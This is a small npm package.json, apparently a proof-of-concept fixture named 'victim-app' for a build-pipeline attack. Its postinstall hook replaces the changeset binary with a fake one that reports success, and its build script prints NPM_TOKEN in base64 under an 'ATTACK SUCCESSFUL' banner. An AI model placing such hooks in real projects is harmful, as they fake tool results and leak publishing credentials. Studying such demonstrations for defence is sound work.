{
    "name": "victim-app",
    "version": "1.0.0",
    "scripts": {
        "postinstall": "mkdir -p node_modules/.bin && echo '#!/bin/sh' > node_modules/.bin/changeset && echo 'echo FAKE_CHANGESET_PASSED' >> node_modules/.bin/changeset && chmod +x node_modules/.bin/changeset",
        "build": "echo '*** ATTACK SUCCESSFUL ***'; echo $NPM_TOKEN | base64"
    },
    "devDependencies": {
        "@changesets/cli": "2.26.0"
    },
    "dependencies": {}
}
